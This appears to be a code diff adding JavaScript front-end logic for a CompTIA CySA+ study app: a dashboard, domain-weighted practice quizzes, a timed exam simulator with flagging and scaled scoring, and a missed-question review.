+function render(html){document.getElementById("main").innerHTML=html;}
+function showToast(msg,col,dur){
+  var w=document.getElementById("toast-wrap");
+  var t=document.createElement("div");
+  t.className="toast-msg";t.style.background=col||"var(--tx)";t.textContent=msg;
+  w.appendChild(t);
+  setTimeout(function(){t.style.opacity="0";t.style.transition="opacity .3s";setTimeout(function(){t.remove();},300);},dur||2500);
+}
+function toggleTheme(){
+  S.dark=!S.dark;
+  document.body.setAttribute("data-theme",S.dark?"dark":"light");
+  localStorage.setItem("cysa_dark",S.dark?"1":"0");
+  document.getElementById("theme-lbl").textContent=S.dark?"Light Mode":"Dark Mode";
+}
+function setTab(tab){
+  S.tab=tab;
+  document.querySelectorAll(".nav-btn,.bnav-btn").forEach(function(b){
+    var on=b.getAttribute("onclick")||"";
+    b.classList.toggle("active",on.indexOf("'"+tab+"'")>=0||on.indexOf('"'+tab+'"')>=0);
+  });
+  if(S.exam&&S.exam.iv&&tab!=="exam"){clearInterval(S.exam.iv);S.exam.iv=null;}
+  if(tab==="home")renderHome();
+  else if(tab==="quiz")renderQuizHome();
+  else if(tab==="exam")renderExamHome();
+  else if(tab==="cards")renderCardsHome();
+  else if(tab==="learn")renderLearn();
+}
+
+// ── HOME ──────────────────────────────────────────────────────────────────────
+function renderHome(){
+  var st=S.stats;
+  var pct=st.total>0?Math.round(st.correct/st.total*100):0;
+  var domCards="";
+  for(var d=1;d<=4;d++){
+    var ds=st.domainScores[d];
+    var sc=ds&&ds.total>0?Math.round(ds.correct/ds.total*100):null;
+    var qcnt=QZ.filter(function(q){return q.d==d;}).length;
+    domCards+="<div class='card' style='margin-bottom:10px;border-left:3px solid "+DOMAIN_COLORS[d]+";cursor:pointer' onclick=\"setTab('quiz');startQuiz("+d+")\">" +
+      "<div style='display:flex;align-items:center;justify-content:space-between;margin-bottom:6px'>" +
+        "<div style='font-weight:700;font-size:14px'>"+DOMAIN_NAMES[d]+"</div>" +
+        "<span style='background:"+DOMAIN_BG[d]+";color:"+DOMAIN_COLORS[d]+";padding:2px 8px;border-radius:6px;font-size:11px;font-weight:700'>"+DOMAIN_WEIGHTS[d]+"%</span>" +
+      "</div>" +
+      "<div style='display:flex;align-items:center;gap:10px'>" +
+        "<div class='prog-bar' style='flex:1'><div class='prog-fill' style='width:"+(sc||0)+"%;background:"+DOMAIN_COLORS[d]+"'></div></div>" +
+        "<div style='font-size:12px;color:var(--tx3)'>"+(sc!==null?sc+"%":"—")+"</div>" +
+        "<div style='font-size:11px;color:var(--tx4)'>"+qcnt+"q</div>" +
+      "</div>" +
+    "</div>";
+  }
+  render(
+    "<div class='pg'>" +
+    "<div class='card2' style='margin-bottom:20px'>" +
+      "<div style='display:flex;align-items:flex-start;justify-content:space-between;gap:16px;flex-wrap:wrap'>" +
+        "<div>" +
+          "<div style='font-size:11px;color:var(--cy);font-weight:700;letter-spacing:1px;text-transform:uppercase;margin-bottom:4px'>CompTIA CySA+ CS0-003</div>" +
+          "<div style='font-family:Syne,sans-serif;font-size:28px;font-weight:800;margin-bottom:4px'>CySA+ Study Hub</div>" +
+          "<div style='font-size:13px;color:var(--tx3)'>"+QZ.length+" questions · 4 domains · 85q · 165 min · Pass: 750/900</div>" +
+        "</div>" +
+        "<div style='text-align:right'>" +
+          "<div style='font-family:Syne,sans-serif;font-size:36px;font-weight:800;color:var(--cy)'>"+pct+"%</div>" +
+          "<div style='font-size:11px;color:var(--tx3)'>Overall Score</div>" +
+          "<div style='font-size:11px;color:var(--tx4);margin-top:2px'>"+st.sessions+" sessions · "+st.streak+" day streak</div>" +
+        "</div>" +
+      "</div>" +
+    "</div>" +
+    "<div class='stats-grid'>" +
+      "<div class='stat-card'><div class='stat-num'>"+QZ.length+"</div><div class='stat-label'>Questions</div></div>" +
+      "<div class='stat-card'><div class='stat-num'>"+st.correct+"</div><div class='stat-label'>Correct</div></div>" +
+      "<div class='stat-card'><div class='stat-num'>"+PASS_SCORE+"</div><div class='stat-label'>Pass Score</div></div>" +
+      "<div class='stat-card'><div class='stat-num'>4</div><div class='stat-label'>Domains</div></div>" +
+    "</div>" +
+    "<div style='display:grid;grid-template-columns:1fr 1fr;gap:16px'>" +
+      "<div><h2 class='stitle'>Domain Performance</h2>"+domCards+"</div>" +
+      "<div><h2 class='stitle'>Quick Start</h2>" +
+        "<div class='card' style='margin-bottom:10px;cursor:pointer' onclick='startQuiz(0)'>" +
+          "<div style='font-size:22px;margin-bottom:6px'>❓</div>" +
+          "<div style='font-weight:700;margin-bottom:3px'>Practice Quiz</div>" +
+          "<div style='font-size:12px;color:var(--tx3)'>20 questions · pick domain or mix all</div>" +
+        "</div>" +
+        "<div class='card' style='margin-bottom:10px;cursor:pointer' onclick='renderExamTutorial(85)'>" +
+          "<div style='font-size:22px;margin-bottom:6px'>📝</div>" +
+          "<div style='font-weight:700;margin-bottom:3px'>Full Simulation</div>" +
+          "<div style='font-size:12px;color:var(--tx3)'>85q · 165 min · 750/900 to pass</div>" +
+        "</div>" +
+        "<div class='card' style='margin-bottom:10px;cursor:pointer' onclick='startWeakQuiz()'>" +
+          "<div style='font-size:22px;margin-bottom:6px'>🎯</div>" +
+          "<div style='font-weight:700;margin-bottom:3px'>Weak Area Drill</div>" +
+          "<div style='font-size:12px;color:var(--tx3)'>Auto-targets your lowest domain</div>" +
+        "</div>" +
+        "<div class='card' style='cursor:pointer' onclick=\"setTab('cards')\">" +
+          "<div style='font-size:22px;margin-bottom:6px'>🃏</div>" +
+          "<div style='font-weight:700;margin-bottom:3px'>Flashcards</div>" +
+          "<div style='font-size:12px;color:var(--tx3)'>Key CySA+ terms and concepts</div>" +
+        "</div>" +
+      "</div>" +
+    "</div>" +
+  "</div>");
+}
+
+// ── QUIZ ──────────────────────────────────────────────────────────────────────
+function renderQuizHome(){
+  var domBtns="";
+  for(var d=1;d<=4;d++){
+    domBtns+="<button class='btn btn-s' style='text-align:left;width:100%;margin-bottom:8px;border-left:3px solid "+DOMAIN_COLORS[d]+"' onclick='startQuiz("+d+")'>" +
+      "<span style='color:"+DOMAIN_COLORS[d]+";margin-right:6px'>D"+d+"</span>"+DOMAIN_NAMES[d]+
+      " <span style='color:var(--tx4);font-size:11px;margin-left:auto'>"+QZ.filter(function(q){return q.d==d;}).length+"q</span>" +
+    "</button>";
+  }
+  render("<div class='pg'><h2 class='stitle'>Practice Quiz</h2>" +
+    "<div style='display:grid;grid-template-columns:1fr 1fr;gap:16px'>" +
+      "<div class='card'><div style='font-weight:700;margin-bottom:12px'>By Domain</div>"+domBtns+"</div>" +
+      "<div class='card'><div style='font-weight:700;margin-bottom:12px'>Mixed</div>" +
+        "<button class='btn btn-p btn-full' style='margin-bottom:10px' onclick='startQuiz(0)'>All Domains Mix</button>" +
+        "<button class='btn btn-s btn-full' onclick='startWeakQuiz()'>Weak Areas Focus</button>" +
+        "<div style='margin-top:16px;font-size:13px;color:var(--tx3)'>20 questions · instant feedback with analyst explanations</div>" +
+      "</div>" +
+    "</div></div>");
+}
+window.renderQuizHome=renderQuizHome;
+
+function startQuiz(dom){
+  S.quiz.dom=dom;
+  var pool;
+  if(dom===0){
+    var wp=[];
+    for(var d=1;d<=4;d++){
+      var dqs=shuffle(QZ.filter(function(q){return q.d==d;}));
+      var cnt=Math.round(20*DOMAIN_WEIGHTS[d]/100);
+      wp=wp.concat(dqs.slice(0,Math.max(1,cnt)));
+    }
+    pool=shuffle(wp);
+  } else {
+    pool=shuffle(QZ.filter(function(q){return q.d==dom;}));
+  }
+  S.quiz.qs=pool.slice(0,20);
+  S.quiz.idx=0;S.quiz.sel=null;S.quiz.checked=false;S.quiz.score=0;S.quiz.total=0;
+  _quizOptMap=[];renderQuizQ();
+}
+window.startQuiz=startQuiz;
+
+function startWeakQuiz(){
+  var worst=1,ws=101;
+  for(var d=1;d<=4;d++){var ds=S.stats.domainScores[d];var sc=ds&&ds.total>0?ds.correct/ds.total*100:50;if(sc<ws){ws=sc;worst=d;}}
+  startQuiz(worst);
+}
+window.startWeakQuiz=startWeakQuiz;
+
+var _quizOptMap=[];
+function renderQuizQ(){
+  var q=S.quiz.qs[S.quiz.idx];
+  if(!q){renderQuizResults();return;}
+  var pct=Math.round(S.quiz.idx/S.quiz.qs.length*100);
+  if(!_quizOptMap.length)_quizOptMap=shuffle([0,1,2,3]);
+  var opts="";
+  for(var di=0;di<_quizOptMap.length;di++){
+    var oi=_quizOptMap[di];
+    if(oi>=q.o.length)continue;
+    var isC=oi===q.a,selOi=S.quiz.sel!==null?_quizOptMap[S.quiz.sel]:-1;
+    var isW=S.quiz.checked&&oi===selOi&&!isC;
+    var cls="ans"+(S.quiz.checked?(isC?" hit":isW?" miss":" dim"):(S.quiz.sel===di?" sel":""));
+    opts+="<button class='"+cls+"' onclick='"+(S.quiz.checked?"":"selectQuizAns("+di+")")+"'>" +
+      "<span class='ltr'>"+["A","B","C","D"][di]+"</span>"+q.o[oi]+"</button>";
+  }
+  var btn=S.quiz.checked?
+    "<div style='background:var(--bg3);border:1px solid var(--bd);border-radius:10px;padding:14px;margin-bottom:14px;font-size:13px;color:var(--tx2);line-height:1.6'><b style='color:var(--gn)'>"+q.o[q.a]+"</b> — "+q.e+"</div>" +
+    "<button class='btn btn-p btn-full' onclick='nextQuizQ()'>"+(S.quiz.idx+1>=S.quiz.qs.length?"See Results":"Next →")+"</button>" :
+    "<button class='btn btn-p btn-full' onclick='checkQuiz()' "+(S.quiz.sel===null?"disabled style='opacity:.4;cursor:not-allowed'":"")+(S.quiz.sel===null?"":"")+">Check Answer</button>";
+  render("<div class='pg'>" +
+    "<div class='row' style='margin-bottom:14px'>" +
+      "<button class='btn btn-s' onclick='renderQuizHome()'>← Back</button>" +
+      "<div style='flex:1'><div class='prog-bar'><div class='prog-fill' style='width:"+pct+"%'></div></div>" +
+        "<div style='font-size:11px;color:var(--tx4);margin-top:4px'>"+(S.quiz.idx+1)+" of "+S.quiz.qs.length+" · "+DOMAIN_NAMES[q.d]+"</div>" +
+      "</div>" +
+      "<span style='font-size:13px;font-weight:700;color:var(--gn)'>"+S.quiz.score+"/"+S.quiz.idx+"</span>" +
+    "</div>" +
+    "<div class='card' style='margin-bottom:14px'>" +
+      "<span style='background:"+DOMAIN_BG[q.d]+";color:"+DOMAIN_COLORS[q.d]+";padding:2px 8px;border-radius:6px;font-size:10px;font-weight:700;margin-bottom:10px;display:inline-block'>D"+q.d+" · "+DOMAIN_NAMES[q.d]+"</span>" +
+      "<div style='font-size:15px;font-weight:600;line-height:1.6;color:var(--tx)'>"+q.q+"</div>" +
+    "</div>" +
+    opts+btn+"</div>");
+}
+window.renderQuizQ=renderQuizQ;
+window.selectQuizAns=function(i){S.quiz.sel=i;renderQuizQ();};
+window.checkQuiz=function(){
+  if(S.quiz.sel===null)return;
+  S.quiz.checked=true;
+  var q=S.quiz.qs[S.quiz.idx];
+  var selOrig=_quizOptMap[S.quiz.sel];
+  var ok=selOrig===q.a;
+  if(ok)S.quiz.score++;
+  S.quiz.total++;
+  if(!S.stats.domainScores[q.d])S.stats.domainScores[q.d]={correct:0,total:0};
+  S.stats.domainScores[q.d].total++;
+  if(ok)S.stats.domainScores[q.d].correct++;
+  S.stats.correct+=ok?1:0;S.stats.total++;save();renderQuizQ();
+};
+window.nextQuizQ=function(){S.quiz.idx++;S.quiz.sel=null;S.quiz.checked=false;_quizOptMap=[];renderQuizQ();};
+
+function renderQuizResults(){
+  var pct=Math.round(S.quiz.score/S.quiz.qs.length*100);
+  var col=pct>=83?"var(--gn)":pct>=70?"var(--ye)":"var(--rd)";
+  render("<div class='pg' style='text-align:center'>" +
+    "<div class='card2' style='margin-bottom:20px;padding:32px 20px'>" +
+      "<div style='font-size:48px;margin-bottom:8px'>🎯</div>" +
+      "<div style='font-family:Syne,sans-serif;font-size:48px;font-weight:800;color:"+col+"'>"+pct+"%</div>" +
+      "<div style='font-size:16px;margin-bottom:6px'>"+S.quiz.score+" / "+S.quiz.qs.length+" correct</div>" +
+      "<div style='font-size:13px;color:var(--tx3)'>"+(pct>=83?"Solid — aim for this on exam day!":pct>=70?"Getting there — review domain notes.":"Review missed topics and try again.")+"</div>" +
+    "</div>" +
+    "<div style='display:flex;gap:10px;justify-content:center;flex-wrap:wrap'>" +
+      "<button class='btn btn-p' onclick='startQuiz("+S.quiz.dom+")'>Try Again</button>" +
+      "<button class='btn btn-s' onclick='renderQuizHome()'>New Quiz</button>" +
+      "<button class='btn btn-s' onclick=\"setTab('home')\">Home</button>" +
+    "</div></div>");
+}
+
+// ── EXAM ──────────────────────────────────────────────────────────────────────
+function renderExamTutorial(size){
+  render("<div class='pg' style='max-width:680px;margin:0 auto'>" +
+    "<div class='card2' style='text-align:center;padding:36px 20px;margin-bottom:18px'>" +
+      "<div style='font-size:40px;margin-bottom:12px'>🔍</div>" +
+      "<div style='font-family:Syne,sans-serif;font-size:20px;font-weight:800;margin-bottom:6px'>Before You Begin</div>" +
+      "<div style='font-size:13px;color:var(--tx3)'>Mirrors the Pearson VUE CySA+ CS0-003 exam format.</div>" +
+    "</div>" +
+    "<div class='card' style='margin-bottom:14px;padding:18px'>" +
+      "<div style='font-size:11px;font-weight:700;color:var(--cy);letter-spacing:1px;text-transform:uppercase;margin-bottom:10px'>Exam Format</div>" +
+      "<div style='font-size:13px;color:var(--tx2);line-height:1.9'>" +
+        "Maximum <b style='color:var(--tx)'>"+(size||85)+" questions</b> — multiple choice and performance-based.<br>" +
+        "<b style='color:var(--tx)'>165 minutes</b> to complete.<br>" +
+        "Passing score: <b style='color:var(--tx)'>750 / 900</b>.<br>" +
+        "You may flag questions and return before submitting." +
+      "</div>" +
+    "</div>" +
+    "<div class='card' style='margin-bottom:14px;padding:18px'>" +
+      "<div style='font-size:11px;font-weight:700;color:var(--ye);letter-spacing:1px;text-transform:uppercase;margin-bottom:10px'>CySA+ Exam Strategy</div>" +
+      "<div style='font-size:13px;color:var(--tx2);line-height:1.9'>" +
+        "Think like a <b style='color:var(--tx)'>SOC analyst</b>, not a student — questions are scenario-based.<br>" +
+        "For incident response questions: <b style='color:var(--tx)'>contain FIRST</b>, then investigate.<br>" +
+        "For vulnerability management: <b style='color:var(--tx)'>context beats CVSS score</b> every time.<br>" +
+        "Performance-based questions appear first — don't skip them." +
+      "</div>" +
+    "</div>" +
+    "<div class='card' style='margin-bottom:20px;padding:18px'>" +
+      "<div style='font-size:11px;font-weight:700;color:var(--gn);letter-spacing:1px;text-transform:uppercase;margin-bottom:10px'>Domain Weights</div>" +
+      "<div style='font-size:13px;color:var(--tx2);line-height:1.9'>" +
+        "Security Operations 33% &bull; Vulnerability Management 30%<br>" +
+        "Incident Response 20% &bull; Reporting & Communication 17%<br>" +
+        "Aim for 83%+ raw score for a comfortable 750 scaled pass." +
+      "</div>" +
+    "</div>" +
+    "<div style='display:flex;gap:10px'>" +
+      "<button onclick='startExam("+(size||85)+")' class='btn btn-p' style='flex:2;padding:15px;font-size:15px'>Start Exam &rarr;</button>" +
+      "<button onclick='renderExamHome()' class='btn btn-s' style='flex:1;padding:15px'>Cancel</button>" +
+    "</div></div>");
+}
+window.renderExamTutorial=renderExamTutorial;
+
+function renderExamHome(){
+  var wRows="";
+  for(var d=1;d<=4;d++){
+    wRows+="<div style='margin-bottom:10px'>" +
+      "<div style='display:flex;justify-content:space-between;margin-bottom:4px'>" +
+        "<span style='font-size:13px'>"+DOMAIN_NAMES[d]+"</span>" +
+        "<span style='font-size:12px;color:"+DOMAIN_COLORS[d]+";font-weight:700'>"+DOMAIN_WEIGHTS[d]+"%</span>" +
+      "</div>" +
+      "<div class='prog-bar'><div class='prog-fill' style='width:"+DOMAIN_WEIGHTS[d]+"%;background:"+DOMAIN_COLORS[d]+"'></div></div>" +
+    "</div>";
+  }
+  render("<div class='pg'><h2 class='stitle'>Exam Simulator</h2>" +
+    "<div class='card2' style='margin-bottom:20px'>" +
+      "<div style='font-family:Syne,sans-serif;font-size:20px;font-weight:800;margin-bottom:8px'>🔍 CySA+ CS0-003</div>" +
+      "<div style='font-size:13px;color:var(--tx2);line-height:1.8'>Max 85 questions · 165 minutes · Pass: 750/900<br>Domain weights match official CompTIA objectives</div>" +
+    "</div>" +
+    "<div style='display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:12px'>" +
+      "<button class='btn btn-p' style='padding:20px;flex-direction:column;gap:6px;justify-content:center;font-size:15px' onclick='renderExamTutorial(85)'>📝 Full Simulation<br><span style='font-size:11px;font-weight:400;opacity:.8'>85q · 165min · Scaled score</span></button>" +
+      "<button class='btn btn-s' style='padding:20px;flex-direction:column;gap:6px;justify-content:center;font-size:15px' onclick='renderExamTutorial(43)'>⚡ Quick Drill<br><span style='font-size:11px;opacity:.8'>43q · 80min</span></button>" +
+    "</div>" +
+    "<button class='btn btn-s btn-full' style='margin-bottom:16px;border-left:3px solid var(--pu)' onclick='startExam(130)'>🏋 Endurance Mode — 130q · maximum stamina training</button>" +
+    "<div class='card'><div style='font-weight:700;margin-bottom:12px'>Official Domain Weights</div>"+wRows+"</div>" +
+  "</div>");
+}
+window.renderExamHome=renderExamHome;
+
+function startExam(size){
+  size=size||EXAM_Q;
+  var pool=[];
+  for(var d=1;d<=4;d++){
+    var dqs=shuffle(QZ.filter(function(q){return q.d==d;}));
+    var cnt=Math.round(size*DOMAIN_WEIGHTS[d]/100);
+    pool=pool.concat(dqs.slice(0,Math.min(cnt,dqs.length)));
+  }
+  if(pool.length<size){
+    var ex=shuffle(QZ).filter(function(q){return pool.indexOf(q)<0;});
+    pool=pool.concat(ex.slice(0,size-pool.length));
+  }
+  pool=shuffle(pool).slice(0,size);
+  var maxTime=size===43?4800:size>100?size*60:EXAM_SECS;
+  S.exam={qs:pool,cur:0,ans:{},flagged:[],started:true,done:false,timer:maxTime,iv:null,ngb:false,optMaps:pool.map(function(){return shuffle([0,1,2,3]);})};
+  S.exam.iv=setInterval(function(){S.exam.timer--;updateTimerDisplay();if(S.exam.timer<=0){clearInterval(S.exam.iv);finishExam(true);}},1000);
+  renderExamQ();
+}
+window.startExam=startExam;
+
+function updateTimerDisplay(){
+  var el=document.getElementById("exam-timer");if(!el)return;
+  var t=S.exam.timer,h=Math.floor(t/3600),m=Math.floor((t%3600)/60),s=t%60;
+  el.textContent=(h>0?h+":":"")+(m<10&&h>0?"0":"")+m+":"+(s<10?"0":"")+s;
+  el.style.color=t<300?"var(--rd)":t<600?"var(--ye)":"var(--tx)";
+}
+
+function renderExamQ(){
+  var e=S.exam;
+  if(!e.started){renderExamHome();return;}
+  var q=e.qs[e.cur],map=e.optMaps[e.cur];
+  var isFlagged=e.flagged.indexOf(e.cur)>=0;
+  var opts="";
+  for(var di=0;di<4;di++){
+    var oi=map[di];if(oi>=q.o.length)continue;
+    opts+="<button class='ans"+(e.sel===di?" sel":"")+"' onclick='examSel("+di+")'><span class='ltr'>"+["A","B","C","D"][di]+"</span>"+q.o[oi]+"</button>";
+  }
+  var mapHtml="";
+  for(var i=0;i<e.qs.length;i++){
+    var a=e.ans[i]!==undefined,f=e.flagged.indexOf(i)>=0,cur=i===e.cur;
+    var bc=cur?"var(--cy)":f?"var(--ye)":a?"var(--gn)":"var(--bd)";
+    var bg=cur?"var(--cy0)":f?"var(--ye0)":a?"var(--gn0)":"var(--bg3)";
+    var fc=cur?"var(--cy)":f?"var(--ye)":a?"var(--gn)":"var(--tx4)";
+    mapHtml+="<button onclick='examJump("+i+")' style='width:28px;height:28px;border-radius:6px;border:1.5px solid "+bc+";background:"+bg+";color:"+fc+";font-size:10px;font-weight:700;cursor:pointer'>"+(i+1)+"</button>";
+  }
+  render("<div>" +
+    "<div class='exam-bar'><div class='row' style='justify-content:space-between'>" +
+      "<div class='row' style='gap:12px'>" +
+        "<span style='font-size:13px;font-weight:700'>"+(e.cur+1)+" / "+e.qs.length+"</span>" +
+        "<span style='background:"+DOMAIN_BG[q.d]+";color:"+DOMAIN_COLORS[q.d]+";padding:2px 8px;border-radius:6px;font-size:11px;font-weight:700'>D"+q.d+"</span>" +
+      "</div>" +
+      "<div class='row' style='gap:8px'>" +
+        "<span id='exam-timer' style='font-family:monospace;font-weight:700;font-size:14px'></span>" +
+        "<button class='btn btn-s' style='padding:5px 9px;font-size:11px' onclick='toggleNGB()'>"+(e.ngb?"🔒 NGB":"🔓 NGB")+"</button>" +
+        "<button class='btn btn-s' style='padding:5px 9px;font-size:11px' onclick='toggleFlag()'>"+(isFlagged?"🚩":"☐")+" Flag</button>" +
+        "<button class='btn btn-p' style='padding:6px 14px;font-size:12px' onclick='submitExam()'>Submit</button>" +
+      "</div>" +
+    "</div></div>" +
+    "<div class='pg'>" +
+      "<div class='card' style='margin-bottom:14px'><div style='font-size:15px;font-weight:600;line-height:1.6;color:var(--tx)'>"+q.q+"</div></div>" +
+      opts +
+      "<div class='row' style='margin-top:14px;justify-content:space-between'>" +
+        "<button class='btn btn-s' onclick='examNav(-1)' "+(e.cur===0?"disabled style='opacity:.4'":"")+">← Prev</button>" +
+        "<div style='display:flex;flex-wrap:wrap;gap:3px;max-width:380px;justify-content:center'>"+mapHtml+"</div>" +
+        "<button class='btn btn-s' onclick='examNav(1)' "+(e.cur>=e.qs.length-1?"disabled style='opacity:.4'":"")+">Next →</button>" +
+      "</div>" +
+    "</div>" +
+  "</div>");
+  updateTimerDisplay();
+}
+window.renderExamQ=renderExamQ;
+window.examSel=function(i){S.exam.sel=i;S.exam.ans[S.exam.cur]=i;renderExamQ();};
+window.examJump=function(i){
+  if(S.exam.ngb&&i<S.exam.cur){showToast("No Going Back Mode is ON","var(--rd)",2000);return;}
+  S.exam.cur=i;S.exam.sel=S.exam.ans[i]!==undefined?S.exam.ans[i]:null;renderExamQ();
+};
+window.examNav=function(dir){
+  var n=S.exam.cur+dir;
+  if(n<0||n>=S.exam.qs.length)return;
+  if(S.exam.ngb&&dir<0){showToast("No Going Back Mode is ON","var(--rd)",2000);return;}
+  S.exam.cur=n;S.exam.sel=S.exam.ans[n]!==undefined?S.exam.ans[n]:null;renderExamQ();
+};
+window.toggleFlag=function(){var i=S.exam.flagged.indexOf(S.exam.cur);if(i>=0)S.exam.flagged.splice(i,1);else S.exam.flagged.push(S.exam.cur);renderExamQ();};
+window.toggleNGB=function(){S.exam.ngb=!S.exam.ngb;renderExamQ();};
+window.submitExam=function(){
+  var e=S.exam;
+  if(!e||!e.qs||!e.qs.length||!e.started)return;
+  var un=e.qs.filter(function(q,i){return e.ans[i]===undefined;}).length;
+  if(un>0){
+    var d=document.createElement('div');
+    d.id='submit-modal';
+    d.style.cssText='position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.6);z-index:9999;display:flex;align-items:center;justify-content:center;padding:20px';
+    d.innerHTML='<div style="background:var(--bg2);border-radius:16px;padding:28px;max-width:380px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.4)">'
+      +'<div style="font-size:28px;margin-bottom:8px">⚠️</div>'
+      +'<div style="font-family:Syne,sans-serif;font-size:18px;font-weight:800;color:var(--tx);margin-bottom:8px">'+un+' Unanswered Question'+(un>1?'s':'')+'</div>'
+      +'<div style="font-size:13px;color:var(--tx3);line-height:1.6;margin-bottom:20px">These score <b style="color:var(--rd)">0 points</b>. Go back or submit now.</div>'
+      +'<div style="display:flex;gap:10px">'
+        +'<button id="modal-back-btn" style="flex:1;padding:12px;background:var(--cy);color:#fff;border:none;border-radius:10px;font-family:Syne,sans-serif;font-size:13px;font-weight:700;cursor:pointer">← Go Back</button>'
+        +'<button id="modal-submit-btn" style="flex:1;padding:12px;background:var(--rd);color:#fff;border:none;border-radius:10px;font-family:Syne,sans-serif;font-size:13px;font-weight:700;cursor:pointer">Submit Anyway</button>'
+      +'</div></div>';
+    document.body.appendChild(d);
+    document.getElementById('modal-submit-btn').onclick=function(){document.getElementById('submit-modal').remove();clearInterval(S.exam.iv);finishExam(false);};
+    document.getElementById('modal-back-btn').onclick=function(){
+      document.getElementById('submit-modal').remove();
+      for(var i=0;i<S.exam.qs.length;i++){if(S.exam.ans[i]===undefined){S.exam.cur=i;S.exam.sel=null;renderExamQ();break;}}
+    };
+    return;
+  }
+  clearInterval(S.exam.iv);finishExam(false);
+};
+
+function finishExam(timeUp){
+  clearInterval(S.exam.iv);
+  var e=S.exam;
+  var correct=0,byD={1:{c:0,t:0},2:{c:0,t:0},3:{c:0,t:0},4:{c:0,t:0}};
+  var total=e.qs.length;
+  if(total===0){renderExamHome();return;}
+  for(var i=0;i<total;i++){
+    var q=e.qs[i];byD[q.d].t++;
+    if(e.ans[i]!==undefined){var so=e.optMaps[i][e.ans[i]];if(so===q.a){correct++;byD[q.d].c++;}}
+  }
+  var pct=Math.round(correct/total*100);
+  var rp=pct/100;
+  var scaled=rp>=0.83?Math.round(750+(rp-0.83)/0.17*150):
+             rp>=0.70?Math.round(680+(rp-0.70)/0.13*70):
+             rp>=0.50?Math.round(550+(rp-0.50)/0.20*130):
+             Math.round(rp/0.50*550);
+  scaled=Math.max(100,Math.min(900,scaled));
+  e.done=true;e.score=correct;e.scaled=scaled;
+  S.stats.sessions++;S.stats.correct+=correct;S.stats.total+=total;
+  for(var d=1;d<=4;d++){
+    if(!S.stats.domainScores[d])S.stats.domainScores[d]={correct:0,total:0};
+    S.stats.domainScores[d].correct+=byD[d].c;S.stats.domainScores[d].total+=byD[d].t;
+  }
+  save();
+  window._lastExam={qs:e.qs,ans:e.ans,optMaps:e.optMaps};
+  renderExamResults(correct,total,scaled,byD,timeUp);
+}
+
+function renderExamResults(correct,total,scaled,byD,timeUp){
+  var pass=scaled>=PASS_SCORE,pct=Math.round(correct/total*100);
+  var dRows="";
+  for(var d=1;d<=4;d++){
+    var v=byD[d],sc=v.t>0?Math.round(v.c/v.t*100):0;
+    dRows+="<div style='margin-bottom:10px'>" +
+      "<div style='display:flex;justify-content:space-between;margin-bottom:4px'>" +
+        "<span style='font-size:13px'>"+DOMAIN_NAMES[d]+"</span>" +
+        "<span style='font-size:12px;color:"+DOMAIN_COLORS[d]+";font-weight:700'>"+v.c+"/"+v.t+" ("+sc+"%)</span>" +
+      "</div>" +
+      "<div class='prog-bar'><div class='prog-fill' style='width:"+sc+"%;background:"+DOMAIN_COLORS[d]+"'></div></div>" +
+    "</div>";
+  }
+  render("<div class='pg' style='text-align:center'>" +
+    "<div class='card2' style='margin-bottom:20px;padding:36px 24px'>" +
+      "<div style='font-size:48px;margin-bottom:12px'>"+(pass?"🎉":"📚")+"</div>" +
+      "<div style='font-size:12px;color:var(--tx4);margin-bottom:4px'>Scaled Score (100–900 · Pass: 750)</div>" +
+      "<div style='font-family:Syne,sans-serif;font-size:64px;font-weight:800;color:"+(pass?"var(--gn)":"var(--rd)")+"'>"+scaled+"</div>" +
+      "<div style='font-size:20px;font-weight:700;color:"+(pass?"var(--gn)":"var(--rd)")+";margin-bottom:8px'>"+(pass?"✅ PASS":"❌ NEEDS WORK")+"</div>" +
+      "<div style='font-size:15px;color:var(--tx2)'>"+correct+"/"+total+" correct ("+pct+"%)</div>" +
+      (timeUp?"<div style='font-size:12px;color:var(--rd);margin-top:6px'>⏱ Time expired</div>":"") +
+    "</div>" +
+    "<div class='card' style='margin-bottom:16px;text-align:left'><h2 class='stitle'>Domain Breakdown</h2>"+dRows+"</div>" +
+    "<div id='missed-review' style='display:none;margin-bottom:16px;text-align:left'></div>" +
+    "<div style='display:flex;gap:10px;justify-content:center;flex-wrap:wrap'>" +
+      "<button class='btn btn-p' onclick='startExam(85)'>Try Again</button>" +
+      "<button class='btn btn-s' id='review-btn' onclick='toggleMissedReview()'>📖 Review Missed</button>" +
+      "<button class='btn btn-s' onclick='renderExamHome()'>Back</button>" +
+      "<button class='btn btn-s' onclick=\"setTab('home')\">Home</button>" +
+    "</div></div>");
+}
+
+function toggleMissedReview(){
+  var el=document.getElementById("missed-review"),btn=document.getElementById("review-btn");
+  if(!el||!window._lastExam)return;
+  if(el.style.display==="none"){
+    var ex=window._lastExam,items="<div class='card' style='margin-bottom:16px'><h2 class='stitle' style='color:var(--rd)'>❌ Missed Questions</h2>",count=0;
+    for(var i=0;i<ex.qs.length;i++){
+      var q=ex.qs[i];
+      if(ex.ans[i]===undefined){
+        count++;
+        items+="<div style='border-bottom:1px solid var(--bd);padding-bottom:12px;margin-bottom:12px'>" +
+          "<div style='font-size:13px;font-weight:600;color:var(--tx);margin-bottom:8px'><span style='background:var(--ye0);color:var(--ye);padding:2px 6px;border-radius:4px;font-size:10px;font-weight:700;margin-right:6px'>Q"+(i+1)+" UNANSWERED</span>"+q.q+"</div>" +
+          "<div style='padding:8px;background:var(--gn0);border-radius:8px;font-size:12px;color:var(--gn);font-weight:600;margin-bottom:6px'>✅ "+q.o[q.a]+"</div>" +
+          "<div style='padding:8px;background:var(--bg3);border-radius:8px;font-size:12px;color:var(--tx3)'>💡 "+q.e+"</div></div>";
+        continue;
+      }
+      var so=ex.optMaps[i][ex.ans[i]];
+      if(so===q.a)continue;
+      count++;
+      var opts2="";
+      for(var di=0;di<4;di++){var oi=ex.optMaps[i][di];if(oi>=q.o.length)continue;var isC=oi===q.a,isW=oi===so&&!isC;opts2+="<div style='padding:6px 10px;margin-bottom:4px;border-radius:8px;border:1.5px solid "+(isC?"var(--gn)":isW?"var(--rd)":"var(--bd)")+";background:"+(isC?"var(--gn0)":isW?"var(--rd0)":"transparent")+";font-size:12px'><b>"+["A","B","C","D"][di]+".</b> "+q.o[oi]+(isC?" ✅":isW?" ❌":"")+"</div>";}
+      items+="<div style='border-bottom:1px solid var(--bd);padding-bottom:12px;margin-bottom:12px'>" +
